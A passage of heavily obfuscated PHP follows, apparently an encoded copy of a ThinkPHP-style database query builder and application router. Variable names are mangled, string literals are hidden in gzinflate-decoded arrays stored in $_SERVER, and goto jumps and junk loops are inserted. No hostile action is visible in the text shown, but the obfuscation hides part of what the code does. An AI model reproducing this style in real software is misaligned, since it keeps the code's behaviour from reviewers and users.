$÷Í”Øı™ = $©×ÙŒÚÙ[1061]; } if (0 === strpos($÷Í”Øı™, $©×ÙŒÚÙ[11])) { $÷“ê‡Şç .= $this->parseThinkWhere($÷Í”Øı™, $ØÌşÆ); } else { if (!preg_match($©×ÙŒÚÙ[1062], trim($÷Í”Øı™))) { think_exception(think_lang($©×ÙŒÚÙ[1063]) . $©×ÙŒÚÙ[4] . $÷Í”Øı™); } $ïµ§òŠ£ = is_array($ØÌşÆ) && isset($ØÌşÆ[$©×ÙŒÚÙ[1064]]); $÷Í”Øı™ = trim($÷Í”Øı™); if (strpos($÷Í”Øı™, $©×ÙŒÚÙ[338])) { $çûèß†ñ = explode($©×ÙŒÚÙ[338], $÷Í”Øı™); $Æ–İÀ€ä = array(); foreach ($çûèß†ñ as $ö‰Ã´ô => $÷»—Ö¾) { $³“¶­ôø = $ïµ§òŠ£ ? $ØÌşÆ[$ö‰Ã´ô] : $ØÌşÆ; $Æ–İÀ€ä[] = $©×ÙŒÚÙ[315] . $this->parseWhereItem($this->parseKey($÷»—Ö¾), $³“¶­ôø) . $©×ÙŒÚÙ[961]; } $÷“ê‡Şç .= implode($©×ÙŒÚÙ[1065], $Æ–İÀ€ä); } elseif (strpos($÷Í”Øı™, $©×ÙŒÚÙ[339])) { $çûèß†ñ = explode($©×ÙŒÚÙ[339], $÷Í”Øı™); $Æ–İÀ€ä = array(); foreach ($çûèß†ñ as $ö‰Ã´ô => $÷»—Ö¾) { $³“¶­ôø = $ïµ§òŠ£ ? $ØÌşÆ[$ö‰Ã´ô] : $ØÌşÆ; $Æ–İÀ€ä[] = $©×ÙŒÚÙ[315] . $this->parseWhereItem($this->parseKey($÷»—Ö¾), $³“¶­ôø) . $©×ÙŒÚÙ[961]; } $÷“ê‡Şç .= implode($©×ÙŒÚÙ[1060], $Æ–İÀ€ä); } else { $÷“ê‡Şç .= $this->parseWhereItem($this->parseKey($÷Í”Øı™), $ØÌşÆ); } } $÷“ê‡Şç .= $©×ÙŒÚÙ[333] . $‡Æ™‰§›; } $÷“ê‡Şç = substr($÷“ê‡Şç, 0, -strlen($‡Æ™‰§›)); } return empty($÷“ê‡Şç) ? $©×ÙŒÚÙ[12] : $©×ÙŒÚÙ[1066] . $÷“ê‡Şç; } protected function parseWhereItem($ğÈ„Áø, $›ãÅÏ§) { $ûÖã»–È =& $_SERVER[ú‡®¯¨±]; $ÈºÈåõ‚ = $ûÖã»–È[12]; if (is_array($›ãÅÏ§)) { if (is_string($›ãÅÏ§[0])) { $Áğ“§² = strtolower($›ãÅÏ§[0]); if (in_array($›ãÅÏ§[0], array($ûÖã»–È[940], $ûÖã»–È[1067], $ûÖã»–È[1068], $ûÖã»–È[1069], $ûÖã»–È[1070], $ûÖã»–È[1071]))) { $ÈºÈåõ‚ .= $ğÈ„Áø . $ûÖã»–È[53] . $›ãÅÏ§[0] . $ûÖã»–È[53] . $this->parseValue($›ãÅÏ§[1]); } elseif (preg_match($ûÖã»–È[1072], $›ãÅÏ§[0])) { $ÈºÈåõ‚ .= $ğÈ„Áø . $ûÖã»–È[53] . $this->exp[$Áğ“§²] . $ûÖã»–È[53] . $this->parseValue($›ãÅÏ§[1]); } elseif (preg_match($ûÖã»–È[1073], $›ãÅÏ§[0])) { if (is_array($›ãÅÏ§[1])) { $¸¢à¾ı™ = isset($›ãÅÏ§[2]) ? strtoupper($›ãÅÏ§[2]) : $ûÖã»–È[1058]; if (in_array($¸¢à¾ı™, array($ûÖã»–È[1057], $ûÖã»–È[1058], $ûÖã»–È[1059]))) { $ƒ»È©êç = array(); foreach ($›ãÅÏ§[1] as $Óë®Æî”) { $ƒ»È©êç[] = $ğÈ„Áø . $ûÖã»–È[53] . $this->exp[$Áğ“§²] . $ûÖã»–È[53] . $this->parseValue($Óë®Æî”); } $ÈºÈåõ‚ .= $ûÖã»–È[315] . implode($ûÖã»–È[53] . $¸¢à¾ı™ . $ûÖã»–È[53], $ƒ»È©êç) . $ûÖã»–È[961]; } } else { $ÈºÈåõ‚ .= $ğÈ„Áø . $ûÖã»–È[53] . $this->exp[$Áğ“§²] . $ûÖã»–È[53] . $this->parseValue($›ãÅÏ§[1]); } } elseif ($ûÖã»–È[352] == $Áğ“§²) { $ÈºÈåõ‚ .= $ûÖã»–È[959] . $ğÈ„Áø . $ûÖã»–È[53] . $›ãÅÏ§[1] . $ûÖã»–È[1074]; } elseif (preg_match($ûÖã»–È[1075], $›ãÅÏ§[0])) { $ÈºÈåõ‚ .= $›ãÅÏ§[0]; } elseif (preg_match($ûÖã»–È[1076], $›ãÅÏ§[0])) { if (isset($›ãÅÏ§[2]) && $ûÖã»–È[352] == $›ãÅÏ§[2]) { $ÈºÈåõ‚ .= $ğÈ„Áø . $ûÖã»–È[53] . $this->exp[$Áğ“§²] . $ûÖã»–È[53] . $›ãÅÏ§[1]; } else { if (is_string($›ãÅÏ§[1])) { $›ãÅÏ§[1] = explode($ûÖã»–È[50], $›ãÅÏ§[1]); } $í±¥Ú¾ù = implode($ûÖã»–È[50], $this->parseValue($›ãÅÏ§[1])); $ÈºÈåõ‚ .= $ğÈ„Áø . $ûÖã»–È[53] . $this->exp[$Áğ“§²] . $ûÖã»–È[959] . $í±¥Ú¾ù . $ûÖã»–È[961]; } } elseif (preg_match($ûÖã»–È[1077], $›ãÅÏ§[0])) { $ªªâ‘Ä˜ = is_string($›ãÅÏ§[1]) ? explode($ûÖã»–È[50], $›ãÅÏ§[1]) : $›ãÅÏ§[1]; $ÈºÈåõ‚ .= $ûÖã»–È[959] . $ğÈ„Áø . $ûÖã»–È[53] . $this->exp[$Áğ“§²] . $ûÖã»–È[53] . $this->parseValue($ªªâ‘Ä˜[0]) . $ûÖã»–È[1060] . $this->parseValue($ªªâ‘Ä˜[1]) . $ûÖã»–È[333]; } else { think_exception(think_lang($ûÖã»–È[1063]) . $ûÖã»–È[4] . $›ãÅÏ§[0]); } } else { $Š•¡şœÇ = count($›ãÅÏ§); $ò¾ë¡Û· = $ûÖã»–È[12]; if (is_string($›ãÅÏ§[$Š•¡şœÇ - 1])) { $ò¾ë¡Û· = isset($›ãÅÏ§[$Š•¡şœÇ - 1]) ? strtoupper($›ãÅÏ§[$Š•¡şœÇ - 1]) : $ûÖã»–È[12]; if (in_array($ò¾ë¡Û·, array($ûÖã»–È[1057], $ûÖã»–È[1058], $ûÖã»–È[1059]))) { $Š•¡şœÇ = $Š•¡şœÇ - 1; } } else { $ò¾ë¡Û· = $ûÖã»–È[1057]; } for ($ä€éÙ³ = 0; $ä€éÙ³ < $Š•¡şœÇ; $ä€éÙ³++) { $ªªâ‘Ä˜ = is_array($›ãÅÏ§[$ä€éÙ³]) ? $›ãÅÏ§[$ä€éÙ³][1] : $›ãÅÏ§[$ä€éÙ³]; if ($ûÖã»–È[352] == strtolower($›ãÅÏ§[$ä€éÙ³][0])) { $ÈºÈåõ‚ .= $ûÖã»–È[315] . $ğÈ„Áø . $ûÖã»–È[53] . $ªªâ‘Ä˜ . $ûÖã»–È[1074] . $ò¾ë¡Û· . $ûÖã»–È[53]; } else { $ÕÚñÂœ = is_array($›ãÅÏ§[$ä€éÙ³]) ? $this->exp[strtolower($›ãÅÏ§[$ä€éÙ³][0])] : $ûÖã»–È[940]; if (!$ÕÚñÂœ && is_array($›ãÅÏ§[$ä€éÙ³]) && in_array($›ãÅÏ§[$ä€éÙ³][0], array($ûÖã»–È[940], $ûÖã»–È[1067], $ûÖã»–È[1068], $ûÖã»–È[1069], $ûÖã»–È[1070], $ûÖã»–È[1071]))) { $ÕÚñÂœ = $›ãÅÏ§[$ä€éÙ³][0]; } $ÈºÈåõ‚ .= $ûÖã»–È[315] . $ğÈ„Áø . $ûÖã»–È[53] . $ÕÚñÂœ . $ûÖã»–È[53] . $this->parseValue($ªªâ‘Ä˜) . $ûÖã»–È[1074] . $ò¾ë¡Û· . $ûÖã»–È[53]; } } $ÈºÈåõ‚ = substr($ÈºÈåõ‚, 0, -4); } } else { $ÈºÈåõ‚ .= $ğÈ„Áø . $ûÖã»–È[1078] . $this->parseValue($›ãÅÏ§); } return $ÈºÈåõ‚; } protected function parseThinkWhere($óÜ««‡, $öËØûåó) { $ª’ûÇÄ =& $_SERVER[ú‡®¯¨±]; $Õë®¿º€ = $ª’ûÇÄ[12]; switch ($óÜ««‡) { case $ª’ûÇÄ[407]: $Õë®¿º€ = $öËØûåó; break; case $ª’ûÇÄ[1061]: $Õë®¿º€ = is_string($öËØûåó) ? $öËØûåó : substr($this->parseWhere($öËØûåó), 6); break; case $ª’ûÇÄ[1079]: parse_str($öËØûåó, $ÀØê÷˜å); if (isset($ÀØê÷˜å[$ª’ûÇÄ[1056]])) { $ğŒ…× = $ª’ûÇÄ[53] . strtoupper($ÀØê÷˜å[$ª’ûÇÄ[1056]]) . $ª’ûÇÄ[53]; unset($ÀØê÷˜å[$ª’ûÇÄ[1056]]); } else { $ğŒ…× = $ª’ûÇÄ[1060]; } $´™½¢½© = array(); foreach ($ÀØê÷˜å as $›ı†±Ã² => $ŠŞ³›Ô) { $´™½¢½©[] = $this->parseKey($›ı†±Ã²) . $ª’ûÇÄ[1078] . $this->parseValue($ŠŞ³›Ô); } $Õë®¿º€ = implode($ğŒ…×, $´™½¢½©); break; } return $Õë®¿º€; } protected function parseLimit($ãÙÀù’) { $ğÚÚ³ßñ =& $_SERVER[ú‡®¯¨±]; return !empty($ãÙÀù’) ? $ğÚÚ³ßñ[51] . $ãÙÀù’ . $ğÚÚ³ßñ[53] : $ğÚÚ³ßñ[12]; } protected function parseJoin($àëë­ŒÄ) { $»Áøğ¨Ø =& $_SERVER[ú‡®¯¨±]; $¡ÇÑØĞ = $»Áøğ¨Ø[12]; if (!empty($àëë­ŒÄ)) { if (is_array($àëë­ŒÄ)) { foreach ($àëë­ŒÄ as $Õ¾ğÇôë => $…Ğ½‘Ì) { if (!1 !== stripos($…Ğ½‘Ì, $»Áøğ¨Ø[1080])) { $¡ÇÑØĞ .= $»Áøğ¨Ø[53] . $…Ğ½‘Ì; } else { $¡ÇÑØĞ .= $»Áøğ¨Ø[1081] . $…Ğ½‘Ì; } } } else { $¡ÇÑØĞ .= $»Áøğ¨Ø[1081] . $àëë­ŒÄ; } } $¡ÇÑØĞ = preg_replace($»Áøğ¨Ø[1082], think_config($»Áøğ¨Ø[986]) . $»Áøğ¨Ø[1083], $¡ÇÑØĞ); return $¡ÇÑØĞ; } protected function parseOrder($££ºİ§¥) { $·Ø™Ñ·ã =& $_SERVER[ú‡®¯¨±]; if (is_array($££ºİ§¥)) { $şÓù¢ò€ = array(); foreach ($££ºİ§¥ as $§—ğ‡Ğ => $¡Àı„œ) { if (is_numeric($§—ğ‡Ğ)) { $şÓù¢ò€[] = $this->parseKey($¡Àı„œ); } else { $¡Àı„œ = in_array(strtoupper(trim($¡Àı„œ)), array($·Ø™Ñ·ã[1084], $·Ø™Ñ·ã[1085])) ? $·Ø™Ñ·ã[53] . $¡Àı„œ : $·Ø™Ñ·ã[12]; if (preg_match($·Ø™Ñ·ã[1086], $§—ğ‡Ğ)) { $şÓù¢ò€[] = $this->parseKey($§—ğ‡Ğ) . $¡Àı„œ; } else { think_exception($·Ø™Ñ·ã[1087] . $§—ğ‡Ğ); } } } $££ºİ§¥ = implode($·Ø™Ñ·ã[50], $şÓù¢ò€); } return !empty($££ºİ§¥) ? $·Ø™Ñ·ã[1088] . $££ºİ§¥ : $·Ø™Ñ·ã[12]; } protected function parseGroup($õ…š¿Óà) { $•ÄÏ£ =& $_SERVER[ú‡®¯¨±]; return !empty($õ…š¿Óà) ? $•ÄÏ£[1089] . $õ…š¿Óà : $•ÄÏ£[12]; } protected function parseHaving($şÛùö¯Ù) { $àÚ¸ôŞÈ =& $_SERVER[ú‡®¯¨±]; return !empty($şÛùö¯Ù) ? $àÚ¸ôŞÈ[1090] . $şÛùö¯Ù : $àÚ¸ôŞÈ[12]; } protected function parseComment($»ÁÂ“Ò) { $ü÷¯”¢ã =& $_SERVER[ú‡®¯¨±]; return !empty($»ÁÂ“Ò) ? $ü÷¯”¢ã[1091] . $»ÁÂ“Ò . $ü÷¯”¢ã[1092] : $ü÷¯”¢ã[12]; } protected function parseDistinct($Ö¸æ¯€÷) { $Òèï‚ğÒ =& $_SERVER[ú‡®¯¨±]; return !empty($Ö¸æ¯€÷) ? $Òèï‚ğÒ[1093] : $Òèï‚ğÒ[12]; } protected function parseUnion($¦©¡»ö ) { $†¬åŠö =& $_SERVER[ú‡®¯¨±]; if (empty($¦©¡»ö )) { return $†¬åŠö[12]; } if (isset($¦©¡»ö [$†¬åŠö[403]])) { $¸¸°àı˜ = $†¬åŠö[1094]; unset($¦©¡»ö [$†¬åŠö[403]]); } else { $¸¸°àı˜ = $†¬åŠö[1095]; } foreach ($¦©¡»ö  as $ÀŠã›ªı) { $ó›Êá±«[] = $¸¸°àı˜ . (is_array($ÀŠã›ªı) ? $this->buildSelectSql($ÀŠã›ªı) : $ÀŠã›ªı); } return implode($†¬åŠö[53], $ó›Êá±«); } public function insert($•ãŞêÏ†, $¡™Öİ‰ = array(), $í«‰¢ğ = false) { $ä¶Ñƒê® =& $_SERVER[ú‡®¯¨±]; $µÓ˜¢Ÿä = $ÉüÇÂø® = array(); $this->model = $¡™Öİ‰[$ä¶Ñƒê®[336]]; foreach ($•ãŞêÏ† as $§¶ÀÊ => $ ¹Íçæ) { if (is_array($ ¹Íçæ) && $ä¶Ñƒê®[352] == $ ¹Íçæ[0]) { $ÉüÇÂø®[] = $this->parseKey($§¶ÀÊ); $µÓ˜¢Ÿä[] = $ ¹Íçæ[1]; } elseif (is_scalar($ ¹Íçæ) || is_null($ ¹Íçæ)) { $ÉüÇÂø®[] = $this->parseKey($§¶ÀÊ); $µÓ˜¢Ÿä[] = $this->parseValue($ ¹Íçæ); } } $©¯€ˆï = ($í«‰¢ğ ? $ä¶Ñƒê®[963] : $ä¶Ñƒê®[964]) . $ä¶Ñƒê®[965] . $this->parseTable($¡™Öİ‰[$ä¶Ñƒê®[334]]) . $ä¶Ñƒê®[959] . implode($ä¶Ñƒê®[50], $ÉüÇÂø®) . $ä¶Ñƒê®[960] . implode($ä¶Ñƒê®[50], $µÓ˜¢Ÿä) . $ä¶Ñƒê®[961]; $©¯€ˆï .= $this->parseLock(isset($¡™Öİ‰[$ä¶Ñƒê®[899]]) ? $¡™Öİ‰[$ä¶Ñƒê®[899]] : !1); $©¯€ˆï .= $this->parseComment(!empty($¡™Öİ‰[$ä¶Ñƒê®[409]]) ? $¡™Öİ‰[$ä¶Ñƒê®[409]] : $ä¶Ñƒê®[12]); return $this->execute($©¯€ˆï, $this->parseBind(!empty($¡™Öİ‰[$ä¶Ñƒê®[340]]) ? $¡™Öİ‰[$ä¶Ñƒê®[340]] : array())); } public function selectInsert($Şúòô‚Ö, $ïäáèä, $è‰Êõ¸£ = array()) { $¨÷İî‚” =& $_SERVER[ú‡®¯¨±]; $this->model = $è‰Êõ¸£[$¨÷İî‚”[336]]; if (is_string($Şúòô‚Ö)) { $Şúòô‚Ö = explode($¨÷İî‚”[50], $Şúòô‚Ö); } array_walk($Şúòô‚Ö, array($this, $¨÷İî‚”[962])); $ÛÅ‡¯Ä· = $¨÷İî‚”[1096] . $this->parseTable($ïäáèä) . $¨÷İî‚”[959] . implode($¨÷İî‚”[50], $Şúòô‚Ö) . $¨÷İî‚”[1074]; $ÛÅ‡¯Ä· .= $this->buildSelectSql($è‰Êõ¸£); return $this->execute($ÛÅ‡¯Ä·, $this->parseBind(!empty($è‰Êõ¸£[$¨÷İî‚”[340]]) ? $è‰Êõ¸£[$¨÷İî‚”[340]] : array())); } public function update($á†ÕŒÀ, $ğ‚ñéó†) { $¢ç¹¥­” =& $_SERVER[ú‡®¯¨±]; $this->model = $ğ‚ñéó†[$¢ç¹¥­”[336]]; $ô€‹¿¤ = $¢ç¹¥­”[1097] . $this->parseTable($ğ‚ñéó†[$¢ç¹¥­”[334]]) . $this->parseSet($á†ÕŒÀ) . $this->parseWhere(!empty($ğ‚ñéó†[$¢ç¹¥­”[330]]) ? $ğ‚ñéó†[$¢ç¹¥­”[330]] : $¢ç¹¥­”[12]) . $this->parseOrder(!empty($ğ‚ñéó†[$¢ç¹¥­”[420]]) ? $ğ‚ñéó†[$¢ç¹¥­”[420]] : $¢ç¹¥­”[12]) . $this->parseLimit(!empty($ğ‚ñéó†[$¢ç¹¥­”[347]]) ? $ğ‚ñéó†[$¢ç¹¥­”[347]] : $¢ç¹¥­”[12]) . $this->parseLock(isset($ğ‚ñéó†[$¢ç¹¥­”[899]]) ? $ğ‚ñéó†[$¢ç¹¥­”[899]] : !1) . $this->parseComment(!empty($ğ‚ñéó†[$¢ç¹¥­”[409]]) ? $ğ‚ñéó†[$¢ç¹¥­”[409]] : $¢ç¹¥­”[12]); return $this->execute($ô€‹¿¤, $this->parseBind(!empty($ğ‚ñéó†[$¢ç¹¥­”[340]]) ? $ğ‚ñéó†[$¢ç¹¥­”[340]] : array())); } public function delete($Çæ¾¬ŸÄ = array()) { $„›ßş‚¼ =& $_SERVER[ú‡®¯¨±]; $this->model = $Çæ¾¬ŸÄ[$„›ßş‚¼[336]]; $Œ™Íûû = $„›ßş‚¼[1098] . $this->parseTable($Çæ¾¬ŸÄ[$„›ßş‚¼[334]]) . $this->parseWhere(!empty($Çæ¾¬ŸÄ[$„›ßş‚¼[330]]) ? $Çæ¾¬ŸÄ[$„›ßş‚¼[330]] : $„›ßş‚¼[12]) . $this->parseOrder(!empty($Çæ¾¬ŸÄ[$„›ßş‚¼[420]]) ? $Çæ¾¬ŸÄ[$„›ßş‚¼[420]] : $„›ßş‚¼[12]) . $this->parseLimit(!empty($Çæ¾¬ŸÄ[$„›ßş‚¼[347]]) ? $Çæ¾¬ŸÄ[$„›ßş‚¼[347]] : $„›ßş‚¼[12]) . $this->parseLock(isset($Çæ¾¬ŸÄ[$„›ßş‚¼[899]]) ? $Çæ¾¬ŸÄ[$„›ßş‚¼[899]] : !1) . $this->parseComment(!empty($Çæ¾¬ŸÄ[$„›ßş‚¼[409]]) ? $Çæ¾¬ŸÄ[$„›ßş‚¼[409]] : $„›ßş‚¼[12]); return $this->execute($Œ™Íûû, $this->parseBind(!empty($Çæ¾¬ŸÄ[$„›ßş‚¼[340]]) ? $Çæ¾¬ŸÄ[$„›ßş‚¼[340]] : array())); } public function select($ªª·€õ¡ = array()) { $İ³ÇÓÍû =& $_SERVER[ú‡®¯¨±]; $this->model = $ªª·€õ¡[$İ³ÇÓÍû[336]]; $•«ÂŠÓß = $this->buildSelectSql($ªª·€õ¡); $ñ£ä–Ñ— = isset($ªª·€õ¡[$İ³ÇÓÍû[404]]) ? $ªª·€õ¡[$İ³ÇÓÍû[404]] : !1; if ($ñ£ä–Ñ—) { $¼‡‚©¡ô = is_string($ñ£ä–Ñ—[$İ³ÇÓÍû[96]]) ? $ñ£ä–Ñ—[$İ³ÇÓÍû[96]] : $İ³ÇÓÍû[1099] . md5($•«ÂŠÓß); $èÎ±Ë¹ = think_cache($¼‡‚©¡ô, $İ³ÇÓÍû[12], $ñ£ä–Ñ—); if (!1 !== $èÎ±Ë¹) { return $èÎ±Ë¹; } } $¼ñ…¶ìÙ = $this->query($•«ÂŠÓß, $this->parseBind(!empty($ªª·€õ¡[$İ³ÇÓÍû[340]]) ? $ªª·€õ¡[$İ³ÇÓÍû[340]] : array())); if ($ñ£ä–Ñ— && !1 !== $¼ñ…¶ìÙ) { think_cache($¼‡‚©¡ô, $¼ñ…¶ìÙ, $ñ£ä–Ñ—); } return $¼ñ…¶ìÙ; } public function buildSelectSql($ãÔ µ¸© = array()) { $öÇ¨Ñæ =& $_SERVER[ú‡®¯¨±]; if (isset($ãÔ µ¸©[$öÇ¨Ñæ[408]])) { if (strpos($ãÔ µ¸©[$öÇ¨Ñæ[408]], $öÇ¨Ñæ[50])) { list($óé¬‘±¶, $ó ®ï‡“) = explode($öÇ¨Ñæ[50], $ãÔ µ¸©[$öÇ¨Ñæ[408]]); } else { $óé¬‘±¶ = $ãÔ µ¸©[$öÇ¨Ñæ[408]]; } $óé¬‘±¶ = $óé¬‘±¶ ? $óé¬‘±¶ : 1; $ó ®ï‡“ = isset($ó ®ï‡“) ? $ó ®ï‡“ : (is_numeric($ãÔ µ¸©[$öÇ¨Ñæ[347]]) ? $ãÔ µ¸©[$öÇ¨Ñæ[347]] : 20); $úÍäÌÚ = $ó ®ï‡“ * ((int) $óé¬‘±¶ - 1); $ãÔ µ¸©[$öÇ¨Ñæ[347]] = $úÍäÌÚ . $öÇ¨Ñæ[50] . $ó ®ï‡“; } if (think_config($öÇ¨Ñæ[1100])) { $€Â—ÆÛ‚ = $öÇ¨Ñæ[1101] . md5(serialize($ãÔ µ¸©)); $Ç‘úù = think_cache($€Â—ÆÛ‚); if ($Ç‘úù) { return $Ç‘úù; } } $ÂÙŞ²§ = $this->parseSql($this->selectSql, $ãÔ µ¸©); $ÂÙŞ²§ .= $this->parseLock(isset($ãÔ µ¸©[$öÇ¨Ñæ[899]]) ? $ãÔ µ¸©[$öÇ¨Ñæ[899]] : !1); if (isset($€Â—ÆÛ‚)) { think_cache($€Â—ÆÛ‚, $ÂÙŞ²§); } return $ÂÙŞ²§; } public function parseSql($˜ÔŞÌ—Õ, $ˆ¦¯ô¼Å = array()) { $Ç®šøÆÕ =& $_SERVER[ú‡®¯¨±]; $˜ÔŞÌ—Õ = str_replace(array($Ç®šøÆÕ[1102], $Ç®šøÆÕ[1103], $Ç®šøÆÕ[1104], $Ç®šøÆÕ[1105], $Ç®šøÆÕ[1106], $Ç®šøÆÕ[1107], $Ç®šøÆÕ[1108], $Ç®šøÆÕ[1109], $Ç®šøÆÕ[1110], $Ç®šøÆÕ[1111], $Ç®šøÆÕ[1112]), array($this->parseTable("{$ˆ¦¯ô¼Å[$Ç®šøÆÕ[334]]}"), $this->parseDistinct(isset($ˆ¦¯ô¼Å[$Ç®šøÆÕ[1113]]) ? $ˆ¦¯ô¼Å[$Ç®šøÆÕ[1113]] : !1), $this->parseField(!empty($ˆ¦¯ô¼Å[$Ç®šøÆÕ[328]]) ? $ˆ¦¯ô¼Å[$Ç®šøÆÕ[328]] : $Ç®šøÆÕ[215]), $this->parseJoin(!empty($ˆ¦¯ô¼Å[$Ç®šøÆÕ[337]]) ? $ˆ¦¯ô¼Å[$Ç®šøÆÕ[337]] : $Ç®šøÆÕ[12]), $this->parseWhere(!empty($ˆ¦¯ô¼Å[$Ç®šøÆÕ[330]]) ? $ˆ¦¯ô¼Å[$Ç®šøÆÕ[330]] : $Ç®šøÆÕ[12]), $this->parseGroup(!empty($ˆ¦¯ô¼Å[$Ç®šøÆÕ[557]]) ? $ˆ¦¯ô¼Å[$Ç®šøÆÕ[557]] : $Ç®šøÆÕ[12]), $this->parseHaving(!empty($ˆ¦¯ô¼Å[$Ç®šøÆÕ[1114]]) ? $ˆ¦¯ô¼Å[$Ç®šøÆÕ[1114]] : $Ç®šøÆÕ[12]), $this->parseOrder(!empty($ˆ¦¯ô¼Å[$Ç®šøÆÕ[420]]) ? $ˆ¦¯ô¼Å[$Ç®šøÆÕ[420]] : $Ç®šøÆÕ[12]), $this->parseLimit(!empty($ˆ¦¯ô¼Å[$Ç®šøÆÕ[347]]) ? $ˆ¦¯ô¼Å[$Ç®šøÆÕ[347]] : $Ç®šøÆÕ[12]), $this->parseUnion(!empty($ˆ¦¯ô¼Å[$Ç®šøÆÕ[402]]) ? $ˆ¦¯ô¼Å[$Ç®šøÆÕ[402]] : $Ç®šøÆÕ[12]), $this->parseComment(!empty($ˆ¦¯ô¼Å[$Ç®šøÆÕ[409]]) ? $ˆ¦¯ô¼Å[$Ç®šøÆÕ[409]] : $Ç®šøÆÕ[12])), $˜ÔŞÌ—Õ); return $˜ÔŞÌ—Õ; } public function getLastSql($õî¼§æ¾ = '') { return $õî¼§æ¾ ? $this->modelSql[$õî¼§æ¾] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ÈôûÂ£²) { return addslashes($ÈôûÂ£²); } public function setModel($—ä¬ş÷î) { $this->model = $—ä¬ş÷î; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto bÅèŞ ğ¼; eè„µìÛßÁ: $_SERVER[¶¬±€ıš] = explode($_SERVER[ú‡®¯¨±][658], gzinflate(substr($_SERVER[ú‡®¯¨±][659], 10, -8))); $ircmkevlqf = $_SERVER[ú‡®¯¨±][660]; class Application { private $defaultModule = "\151\156\x64\145\x78"; private $defaultController = "\x69\x6e\144\x65\170"; private $defaultAction = "\151\156\x64\145\x78"; function __construct() { } public function setDefault($š…€‹‚ş) { $«ı¨¤«Í =& $_SERVER[ú‡®¯¨±]; $è”†Ö¾€ =& $_SERVER[¶¬±€ıš]; $â ‹¯ä† = explode($è”†Ö¾€[0], trim($š…€‹‚ş, $è”†Ö¾€[0])); $this->defaultModule = $â ‹¯ä†[0] ? $â ‹¯ä†[0] : $this->defaultModule; $this->defaultController = $â ‹¯ä†[1] ? $â ‹¯ä†[1] : $this->defaultController; $this->defaultAction = $â ‹¯ä†[2] ? $â ‹¯ä†[2] : $this->defaultAction; $…èïÚ¨ = $«ı¨¤«Í[661]; while (strlen($…èïÚ¨) < $«ı¨¤«Í[662]) { if (!$…èïÚ¨) { break; } $…èïÚ¨++; } $this->axfy04f969d1($è”†Ö¾€[1], array($this, $è”†Ö¾€[2])); $¡±“æ = $«ı¨¤«Í[663]; } public function appRun($ôÈ¼ô¯) { $ıİíÕ½» =& $_SERVER[ú‡®¯¨±]; $¹Æú­‚î =& $_SERVER[¶¬±€ıš]; $Î¢ÏÃ¦ = explode($¹Æú­‚î[0], $ôÈ¼ô¯); $çÚğÌñ = $ıİíÕ½»[664]; if (!$çÚğÌñ) { return; } $‘ñŸá™ø = strtolower($Î¢ÏÃ¦[0]); $°àÉ¤±¹ = $ıİíÕ½»[665]; $ûšÆ£´Ñ = $¹Æú­‚î[3]; if ($‘ñŸá™ø == $¹Æú­‚î[4]) { $ûšÆ£´Ñ = $¹Æú­‚î[5]; $Î¢ÏÃ¦[0] = $¹Æú­‚î[6]; $Î¢ÏÃ¦[1] = $Î¢ÏÃ¦[1] . $¹Æú­‚î[7]; $ôÈ¼ô¯ = join($¹Æú­‚î[0], $Î¢ÏÃ¦); $ôÈ¼ô¯ = trim($ôÈ¼ô¯, $¹Æú­‚î[0]); } call_user_func(array($¹Æú­‚î[8], $¹Æú­‚î[9]), $ûšÆ£´Ñ . $¹Æú­‚î[10], $ôÈ¼ô¯); ActionCall($ôÈ¼ô¯); call_user_func(array($¹Æú­‚î[8], $¹Æú­‚î[9]), $ûšÆ£´Ñ . $¹Æú­‚î[11], $ôÈ¼ô¯); $ìÆåÓå’ = $ıİíÕ½»[666]; } private function autorun() { $²âĞÛûñ =& $_SERVER[¶¬±€ıš]; global $config; if (count($config[$²âĞÛûñ[12]]) == 0) { return; } foreach ($config[$²âĞÛûñ[12]] as $ÉÌœ³™ => $Ö˜š€ÛÖ) { $this->appRun($Ö˜š€ÛÖ); } } private function dpho83ff6e8f() { $’ëÚşÓ¶ =& $_SERVER[ú‡®¯¨±]; $«ã¥£ =& $_SERVER[¶¬±€ıš]; $ğ‰üæõö = $«ã¥£[4]; $âÒâæ€ = $’ëÚşÓ¶[667]; $”‡¾”›¶ = $GLOBALS[$«ã¥£[13]][$«ã¥£[14]][0]; $ªœé‘‡Ì = $’ëÚşÓ¶[668]; while (strlen($ªœé‘‡Ì) < $’ëÚşÓ¶[662]) { if (!$ªœé‘‡Ì) { break; } $ªœé‘‡Ì++; } if (!$”‡¾”›¶ || strlen($”‡¾”›¶) <= strlen($ğ‰üæõö)) { return; } if (strtolower(substr($”‡¾”›¶, -strlen($ğ‰üæõö))) != $ğ‰üæõö) { return; } $ÃÒøÁË» = substr($”‡¾”›¶, 0, -strlen($ğ‰üæõö)); $¯÷ƒãÎ´ = $’ëÚşÓ¶[669]; while (strlen($¯÷ƒãÎ´) < $’ëÚşÓ¶[662]) { if (!$¯÷ƒãÎ´) { break; } $¯÷ƒãÎ´++; } $Ö¦º ŸÌ = array($«ã¥£[4], $ÃÒøÁË»); $³ï‹¥± = array_slice($GLOBALS[$«ã¥£[13]][$«ã¥£[14]], 1); $ªàĞéÆ‚ = $’ëÚşÓ¶[670]; if (!$ªàĞéÆ‚) { return; } $GLOBALS[$«ã¥£[13]][$«ã¥£[14]] = array_merge($Ö¦º ŸÌ, $³ï‹¥±); $Öß¨±àÂ = $’ëÚşÓ¶[671]; if (strlen($Öß¨±àÂ) < $’ëÚşÓ¶[662]) { die; } $GLOBALS[$«ã¥£[13]][$«ã¥£[15]] = implode($«ã¥£[0], $GLOBALS[$«ã¥£[13]][$«ã¥£[14]]); $„ÀèØÃã = $’ëÚşÓ¶[672]; while (strlen($„ÀèØÃã) < $’ëÚşÓ¶[673]) { if (!$„ÀèØÃã) { break; } $„ÀèØÃã++; } } private function bdrc42a3f920() { $ü‘ƒß¤Ö =& $_SERVER[ú‡®¯¨±]; $ÍƒŒÜ  =& $_SERVER[¶¬±€ıš]; if ($GLOBALS[$ÍƒŒÜ [13]][$ÍƒŒÜ [15]] != $ÍƒŒÜ [6]) { return; } $¶ô×Û´À = $_SERVER[$ÍƒŒÜ [16]]; $ú¡ÄàÙà = $ü‘ƒß¤Ö[674]; if (strlen($ú¡ÄàÙà) < $ü‘ƒß¤Ö[675]) { return; } $÷ºÒÉ‘ = $ÍƒŒÜ [17]; if (!strstr($¶ô×Û´À, $÷ºÒÉ‘)) { return; } $çè §¯ş = strrpos($¶ô×Û´À, $÷ºÒÉ‘); $ƒ 